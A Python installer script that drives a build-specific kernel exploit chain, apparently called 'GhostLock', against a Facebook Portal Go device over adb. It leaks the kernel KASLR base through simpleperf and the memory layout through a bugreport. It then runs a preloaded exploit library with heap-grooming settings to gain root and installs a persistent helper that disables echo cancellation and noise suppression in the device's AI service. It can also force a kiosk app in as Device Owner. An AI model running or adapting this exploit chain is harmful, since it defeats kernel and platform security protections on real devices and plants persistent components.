#!/usr/bin/env python3
"""Install and verify the Portal Go audio watchdog on the supported build."""

from __future__ import annotations

import argparse
import collections
import datetime as dt
import pathlib
import re
import select
import shlex
import subprocess
import sys
import tempfile
import time
import zipfile


ROOT = pathlib.Path(__file__).resolve().parents[1]
EXPECTED_FINGERPRINT = (
    "Facebook/terry_prod/terry:10/QKQ1.210213.001/"
    "5051355900018050:user/prod-keys"
)
PRELOAD_LOCAL = ROOT / "exploit/build/preload-portal-terry-5051355900018050.so"
HELPER_LOCAL = ROOT / "helper/build/libportal_audio_persist.so"
PRELOAD_REMOTE = "/data/local/tmp/preload-portal.so"
HELPER_REMOTE = "/data/local/tmp/libportal_audio_persist.so"
KIOSK_COMPONENT = "me.jxl.kiosk_satellite/.KioskAdminReceiver"
KIOSK_OWNER_COMPONENTS = (
    "admin=me.jxl.kiosk_satellite/.KioskAdminReceiver",
    "admin=ComponentInfo{me.jxl.kiosk_satellite/"
    "me.jxl.kiosk_satellite.KioskAdminReceiver}",
)


class InstallError(RuntimeError):
    pass


class PortalInstaller:
    def __init__(
        self,
        serial: str,
        attempts: int,
        log_dir: pathlib.Path,
        device_owner: bool = False,
    ):
        self.serial = serial
        self.attempts = attempts
        self.log_dir = log_dir
        self.device_owner = device_owner
        self.adb = ["adb", "-s", serial]

    @staticmethod
    def run(
        args: list[str], timeout: float | None = None, check: bool = False
    ) -> subprocess.CompletedProcess[str]:
        try:
            result = subprocess.run(
                args,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=timeout,
                check=False,
            )
        except subprocess.TimeoutExpired as exc:
            raise InstallError(f"command timed out: {shlex.join(args)}") from exc
        if check and result.returncode != 0:
            raise InstallError(
                f"command failed ({result.returncode}): {shlex.join(args)}\n"
                f"{result.stdout[-2000:]}"
            )
        return result

    def adb_run(
        self, args: list[str], timeout: float | None = None, check: bool = False
    ) -> subprocess.CompletedProcess[str]:
        return self.run(self.adb + args, timeout=timeout, check=check)

    def connect(self, wait_seconds: int = 150) -> None:
        subprocess.run(
            ["adb", "disconnect", self.serial],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False,
        )
        deadline = time.monotonic() + wait_seconds
        while time.monotonic() < deadline:
            subprocess.run(
                ["adb", "connect", self.serial],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False,
            )
            try:
                state = self.adb_run(["get-state"], timeout=5)
                completed = self.adb_run(
                    ["shell", "getprop", "sys.boot_completed"], timeout=5
                )
                if state.returncode == 0 and completed.stdout.strip() == "1":
                    return
            except InstallError:
                pass
            time.sleep(3)
        raise InstallError(f"{self.serial} did not reconnect after {wait_seconds}s")

    def reboot(self) -> tuple[str, str]:
        before = self.adb_run(
            ["shell", "cat", "/proc/sys/kernel/random/boot_id"],
            timeout=5,
            check=True,
        ).stdout.strip()
        try:
            self.adb_run(["reboot"], timeout=8)
        except InstallError:
            # adbd can disappear before acknowledging a successful reboot.
            pass
        after = self.connect_after_reboot(before)
        return before, after

    def connect_after_reboot(self, before: str, wait_seconds: int = 180) -> str:
        subprocess.run(
            ["adb", "disconnect", self.serial],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False,
        )
        deadline = time.monotonic() + wait_seconds
        last_boot_id = ""
        while time.monotonic() < deadline:
            subprocess.run(
                ["adb", "connect", self.serial],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False,
            )
            try:
                state = self.adb_run(["get-state"], timeout=5)
                completed = self.adb_run(
                    ["shell", "getprop", "sys.boot_completed"], timeout=5
                )
                boot = self.adb_run(
                    ["shell", "cat", "/proc/sys/kernel/random/boot_id"], timeout=5
                )
                last_boot_id = boot.stdout.strip()
                if (
                    state.returncode == 0
                    and completed.stdout.strip() == "1"
                    and last_boot_id
                    and last_boot_id != before
                ):
                    return last_boot_id
            except InstallError:
                pass
            time.sleep(3)
        raise InstallError(
            f"{self.serial} did not complete a new boot after {before}; "
            f"last boot ID was {last_boot_id!r}"
        )

    def verify_target(self) -> None:
        fingerprint = self.adb_run(
            ["shell", "getprop", "ro.build.fingerprint"], timeout=5, check=True
        ).stdout.strip()
        if fingerprint != EXPECTED_FINGERPRINT:
            raise InstallError(
                "unsupported firmware; refusing build-specific kernel writes\n"
                f"expected: {EXPECTED_FINGERPRINT}\nactual:   {fingerprint}"
            )
        model = self.adb_run(
            ["shell", "getprop", "ro.product.device"], timeout=5, check=True
        ).stdout.strip()
        if model != "terry":
            raise InstallError(f"unsupported device: {model!r}")
        print(f"TARGET_OK serial={self.serial} device={model} fingerprint={fingerprint}")

    def stage(self) -> None:
        for local, remote in (
            (PRELOAD_LOCAL, PRELOAD_REMOTE),
            (HELPER_LOCAL, HELPER_REMOTE),
        ):
            if not local.is_file() or local.stat().st_size == 0:
                raise InstallError(f"missing build output: {local}")
            self.adb_run(["push", str(local), remote], timeout=30, check=True)
            self.adb_run(["shell", "chmod", "0755", remote], timeout=5, check=True)
        print(f"STAGED preload={PRELOAD_REMOTE} helper={HELPER_REMOTE}")

    def device_owner_preflight(self) -> bool:
        policy = self.adb_run(
            ["shell", "dumpsys", "device_policy"], timeout=15, check=True
        ).stdout
        component = KIOSK_COMPONENT
        is_owner = "Device Owner:" in policy and any(
            owner_component in policy for owner_component in KIOSK_OWNER_COMPONENTS
        )
        is_admin = (
            "Enabled Device Admins (User 0" in policy
            and f"    {component}:" in policy
        )
        if "Device Owner:" in policy and not is_owner:
            raise InstallError("another Device Owner is already registered")
        if not is_admin:
            raise InstallError(f"Kiosk Satellite admin is not active: {component}")
        print(
            f"DEVICE_OWNER_PREFLIGHT component={component} "
            f"active_admin=1 already_owner={int(is_owner)}"
        )
        return is_owner

    def kaslr_base(self, tag: str) -> int:
        offsets = (
            0x3D7E,
            0x3D54,
            0x153C,
            0x11756DC,
            0x1175724,
            0x363C6,
            0xAF90E,
            0x136E,
            0x3A72,
        )
        for sample_try in range(3):
            remote = f"/data/local/tmp/portal-perf-{tag}-{sample_try}.data"
            command = (
                "simpleperf record -g -e cpu-clock -f 4000 --duration 2 "
                f"-o {shlex.quote(remote)} -- /system/bin/dd if=/dev/zero "
                "of=/dev/null bs=4096"
            )
            self.adb_run(["shell", command], timeout=20)
            report = self.adb_run(
                ["shell", "simpleperf", "report-sample", "-i", remote],
                timeout=30,
            )
            self.adb_run(["shell", "rm", "-f", remote], timeout=5)
            values = [
                int(value, 16)
                for value in re.findall(
                    r"vaddr_in_file: (ffffff[0-9a-f]+)", report.stdout
                )
            ]
            candidates: collections.Counter[int] = collections.Counter()
            for value in values:
                for offset in offsets:
                    base = value - offset
                    if (
                        base >= 0xFFFFFF8000000000
                        and (base - 0xFFFFFF8008080000) & 0x1FFFFF == 0
                    ):
                        candidates[base] += 1
            if candidates:
                return candidates.most_common(1)[0][0]
        raise InstallError("simpleperf did not expose a recognized kernel PC")

    def memstart(self, tag: str) -> int:
        result = self.adb_run(["shell", "bugreportz", "-p"], timeout=180)
        match = re.search(r"OK:(\S+\.zip)", result.stdout)
        if not match:
            raise InstallError(f"bugreportz failed: {result.stdout[-500:]}")
        remote = match.group(1)
        with tempfile.TemporaryDirectory(prefix=f"portal-{tag}-") as temporary:
            local = pathlib.Path(temporary) / "bugreport.zip"
            self.adb_run(["pull", remote, str(local)], timeout=60, check=True)
            self.adb_run(["shell", "rm", "-f", remote], timeout=5)
            with zipfile.ZipFile(local) as archive:
                report_name = next(
                    (
                        name
                        for name in archive.namelist()
                        if pathlib.PurePosixPath(name).name.startswith("bugreport-")
                        and name.endswith(".txt")
                    ),
                    None,
                )
                if report_name is None:
                    raise InstallError("bugreport text is absent from archive")
                report = archive.read(report_name).decode(errors="replace")
        match = re.search(r"memory\s+: (0x[0-9a-f]+) -", report)
        if not match:
            raise InstallError("kernel virtual memory range is absent from bugreport")
        virtual_start = int(match.group(1), 16)
        return (
            0x80000000 - (virtual_start - 0xFFFFFFC000000000)
        ) & 0xFFFFFFFFFFFFFFFF

    def exploit(self, base: int, memstart: int, attempt: int) -> bool:
        environment = {
            "GHOSTLOCK_KASLR_BASE": hex(base),
            "GHOSTLOCK_P0_MEMSTART": hex(memstart),
            "GHOSTLOCK_TRUST_EXTERNAL_KASLR": "1",
            "GHOSTLOCK_MM_PARTIALS": "14",
            "GHOSTLOCK_PAGE_COLLISIONS": "5",
            "GHOSTLOCK_BUDDY_HOLD_PAIRS": "64",
            "GHOSTLOCK_BUDDY_HOLD_SENDS": "1024",
            "GHOSTLOCK_RECLAIM_PAIRS": "64",
            "GHOSTLOCK_RECLAIM_SENDS": "64",
            "GHOSTLOCK_SOCKET_WATCH": "1",
            "GHOSTLOCK_WATCH_CFI": "1",
            "GHOSTLOCK_SENDMMSG_PROC_UID_LOCK": "1",
            "GHOSTLOCK_PROC_UID_APP_SENTINEL": "1",
            "GHOSTLOCK_PROC_UID_RUNAS_SENTINEL": "1",
            "GHOSTLOCK_SLIDE_BREAK_OWNER_CHAIN": "1",
            "GHOSTLOCK_HOLD_AFTER_SCHED": "1",
            "GHOSTLOCK_MAIN_ROUTE": "slide-sendmmsg",
            "GHOSTLOCK_FOPS_STACK_ROUTE": "sendmmsg",
            "GHOSTLOCK_PROC_UID_WARM_MB": "256",
            "GHOSTLOCK_ADBD_ROOT_CONFIGFS": "1",
            "GHOSTLOCK_ROOT_SELF_CONFIGFS": "1",
            "GHOSTLOCK_AUDIO_CTL": "1",
            "GHOSTLOCK_AUDIO_PERSIST": "1",
            "GHOSTLOCK_AUDIO_PERSIST_SO": HELPER_REMOTE,
            "GHOSTLOCK_VOLATILE_LOG": "1",
            "LD_PRELOAD": PRELOAD_REMOTE,
        }
        if self.device_owner:
            environment["GHOSTLOCK_KIOSK_DEVICE_OWNER"] = "1"
        self.adb_run(
            ["shell", "am", "force-stop", "--user", "0", "com.facebook.aloha.analytics"],
            timeout=10,
        )
        self.adb_run(["shell", "logcat", "-c"], timeout=5)
        shell = "env " + " ".join(
            f"{name}={shlex.quote(value)}" for name, value in environment.items()
        ) + " /system/bin/true"
        log_path = self.log_dir / f"attempt-{attempt}.log"
        success = False
        failed = False
        failure_markers = (
            "WATCH_CFI_OK=0",
            "pre-signal FOPS check miss",
            "held reclaim payload inspection complete clean=0",
            "held child CFI complete ok=0",
        )
        with log_path.open("w", encoding="utf-8") as output:
            process = subprocess.Popen(
                self.adb + ["shell", shell],
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=1,
            )
            assert process.stdout is not None
            deadline = time.monotonic() + 300
            while time.monotonic() < deadline:
                ready, _, _ = select.select([process.stdout], [], [], 1)
                if not ready:
                    if process.poll() is not None:
                        break
                    continue
                line = process.stdout.readline()
                if not line:
                    break
                sys.stdout.write(line)
                sys.stdout.flush()
                output.write(line)
                output.flush()
                success_marker = (
                    "kiosk device owner install "
                    if self.device_owner
                    else "audio persistence install "
                )
                if success_marker in line and "ok=1" in line:
                    success = True
                    break
                if any(marker in line for marker in failure_markers):
                    failed = True
                    break

            print(
                f"INSTALL_ATTEMPT_RESULT attempt={attempt} "
                f"success={int(success)} early_failure={int(failed)}"
            )
            try:
                self.adb_run(["reboot"], timeout=8)
            except InstallError:
                pass
            process.terminate()
            try:
                process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait(timeout=3)
        return success

    def verify_watchdog(self, wait_seconds: int = 25) -> str:
        deadline = time.monotonic() + wait_seconds
        last_log = ""
        while time.monotonic() < deadline:
            result = self.adb_run(
                ["shell", "logcat", "-d", "-s", "PortalAudioPersist:*"],
                timeout=10,
            )
            last_log = result.stdout
            started = "persistent audio watchdog started" in last_log
            verified = "audio processing verified aec=0 ns=0" in last_log
            aec = re.search(r"param=3001 .*after=0 .*ok=1", last_log)
            ns = re.search(r"param=4001 .*after=0 .*ok=1", last_log)
            if started and (verified or (aec and ns)):
                pid = self.adb_run(
                    ["shell", "pidof", "com.facebook.portal.aiservice"],
                    timeout=5,
                    check=True,
                ).stdout.strip()
                boot_id = self.adb_run(
                    ["shell", "cat", "/proc/sys/kernel/random/boot_id"],
                    timeout=5,
                    check=True,
                ).stdout.strip()
                print(f"WATCHDOG_OK boot_id={boot_id} aiservice_pid={pid}")
                print(last_log.rstrip())
                return boot_id
            time.sleep(2)
        raise InstallError(
            "watchdog did not verify after boot; recent log follows:\n"
            + last_log[-4000:]
        )

    def verify_device_owner(self) -> None:
        component = KIOSK_COMPONENT
        policy = self.adb_run(
            ["shell", "dumpsys", "device_policy"], timeout=15, check=True
        ).stdout
        owner_block = re.search(
            r"Device Owner:\s+(.*?)(?:\n\s*Profile Owner|\n\S|\Z)",
            policy,
            re.DOTALL,
        )
        if (
            owner_block is None
            or not any(
                owner_component in owner_block.group(1)
                for owner_component in KIOSK_OWNER_COMPONENTS
            )
            or "User ID: 0" not in owner_block.group(1)
        ):
            raise InstallError(
                "Kiosk Satellite is not the loaded Device Owner; "
                "dumpsys excerpt follows:\n" + policy[:5000]
            )
        owner_property = self.adb_run(
            ["shell", "getprop", "ro.device_owner"], timeout=5, check=True
        ).stdout.strip()
        if owner_property != "true":
            raise InstallError(
                f"Device Owner loaded but ro.device_owner={owner_property!r}"
            )
        print(
            f"DEVICE_OWNER_OK component={component} user=0 "
            f"ro.device_owner={owner_property}"
        )

    def install(self) -> None:
        self.connect(wait_seconds=30)
        self.verify_target()
        already_owner = self.device_owner_preflight() if self.device_owner else False
        if already_owner:
            self.verify_device_owner()
            print("INSTALL_OK Kiosk Satellite is already Device Owner")
            return
        self.stage()
        clean_boot_id: str | None = None
        for attempt in range(1, self.attempts + 1):
            if clean_boot_id is None:
                print(f"INSTALL_ATTEMPT={attempt} preparing clean boot", flush=True)
                _, boot_id = self.reboot()
            else:
                boot_id = clean_boot_id
                clean_boot_id = None
                print(
                    f"INSTALL_ATTEMPT={attempt} using post-attempt clean boot "
                    f"boot_id={boot_id}",
                    flush=True,
                )
            try:
                base = self.kaslr_base(str(attempt))
                memstart = self.memstart(str(attempt))
            except InstallError as exc:
                print(f"ADDRESS_DISCOVERY_RETRY attempt={attempt} error={exc}")
                continue
            print(
                f"RUNTIME_ADDRESSES attempt={attempt} boot_id={boot_id} "
                f"kaslr={base:#x} memstart={memstart:#x}",
                flush=True,
            )
            exploit_ok = self.exploit(base, memstart, attempt)
            post_attempt_boot = self.connect_after_reboot(boot_id)
            if not exploit_ok:
                clean_boot_id = post_attempt_boot
                continue
            first_boot = self.verify_watchdog()
            if first_boot != post_attempt_boot:
                raise InstallError(
                    "watchdog verification boot differs from post-attempt boot: "
                    f"{post_attempt_boot} != {first_boot}"
                )
            if self.device_owner:
                self.verify_device_owner()
            print("VERIFY_REBOOT starting", flush=True)
            before, second_boot = self.reboot()
            if before != first_boot:
                raise InstallError(
                    f"unexpected boot changed before verification: {first_boot} -> {before}"
                )
            self.verify_watchdog()
            if self.device_owner:
                self.verify_device_owner()
            print(
                f"INSTALL_OK first_boot={first_boot} second_boot={second_boot} "
                f"logs={self.log_dir}"
            )
            return
        raise InstallError(f"installation failed after {self.attempts} attempts")


def build() -> None:
    commands = (
        ["make", "-C", str(ROOT / "exploit"), "-j2", "all"],
        ["make", "-C", str(ROOT / "helper"), "native"],
    )
    for command in commands:
        result = subprocess.run(command, cwd=ROOT, check=False)
        if result.returncode != 0:
            raise InstallError(f"build failed: {shlex.join(command)}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Install the native AEC/NS watchdog through the build-specific "
            "Portal Go GhostLock route, then verify it across two reboots."
        )
    )
    parser.add_argument("--serial", default="192.168.1.72:5555")
    parser.add_argument("--attempts", type=int, default=12)
    parser.add_argument(
        "--device-owner",
        action="store_true",
        help=(
            "also install Kiosk Satellite as Device Owner and verify it "
            "across both reboots"
        ),
    )
    parser.add_argument(
        "--skip-build", action="store_true", help="use existing build outputs"
    )
    parser.add_argument(
        "--log-dir",
        type=pathlib.Path,
        help="directory for exploit attempt logs (default: a timestamp under /tmp)",
    )
    args = parser.parse_args()
    if not 1 <= args.attempts <= 100:
        parser.error("--attempts must be between 1 and 100")
    return args


def main() -> int:
    args = parse_args()
    stamp = dt.datetime.now().strftime("%Y%m%d-%H%M%S")
    log_dir = args.log_dir or pathlib.Path(f"/tmp/portal-audio-install-{stamp}")
    log_dir.mkdir(parents=True, exist_ok=True)
    try:
        if not args.skip_build:
            build()
        PortalInstaller(
            args.serial, args.attempts, log_dir, device_owner=args.device_owner
        ).install()
    except (InstallError, OSError, zipfile.BadZipFile) as exc:
        print(f"INSTALL_ERROR: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
